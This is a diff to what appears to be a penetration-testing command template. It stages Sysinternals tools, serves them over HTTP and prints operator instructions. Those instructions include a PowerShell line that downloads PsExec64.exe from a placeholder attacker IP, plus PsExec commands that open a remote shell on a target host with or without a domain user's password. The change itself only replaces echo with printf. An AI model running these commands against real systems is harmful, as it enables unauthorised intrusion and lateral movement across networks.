@@ -7,12 +7,12 @@ metadata:
 
 content: |
   mkdir -p packstation/outbound; bash -c 'cp -n {{ tools_dir }}/sysinternals/* packstation/outbound'; \
-  echo '================================================================'; \
-  echo '                      -----PowerShell-----                      '; \
-  echo 'Deliver, Save to disk (PsExec64.exe): iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/PsExec64.exe -Outfile {{ delivery_path_windows }}\PsExec64.exe'; \
-  echo 'Run (PsExec64.exe - with creds): {{ delivery_path_windows }}\PsExec64.exe -i \\\<target_hostname> -u <domain>\<target_user> -p <password> cmd'; \
-  echo 'Run (PsExec64.exe - tgt): {{ delivery_path_windows }}\PsExec64.exe \\\<target_hostname> cmd'; \
-  echo '================================================================'; \
-  echo '                         -----CMD-----                          '; \
-  echo '================================================================'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                      -----PowerShell-----                      '; \
+  printf '%s\n' 'Deliver, Save to disk (PsExec64.exe): iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/PsExec64.exe -Outfile {{ delivery_path_windows }}\PsExec64.exe'; \
+  printf '%s\n' 'Run (PsExec64.exe - with creds): {{ delivery_path_windows }}\PsExec64.exe -i \\\<target_hostname> -u <domain>\<target_user> -p <password> cmd'; \
+  printf '%s\n' 'Run (PsExec64.exe - tgt): {{ delivery_path_windows }}\PsExec64.exe \\\<target_hostname> cmd'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                         -----CMD-----                          '; \
+  printf '%s\n' '================================================================'; \
   python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
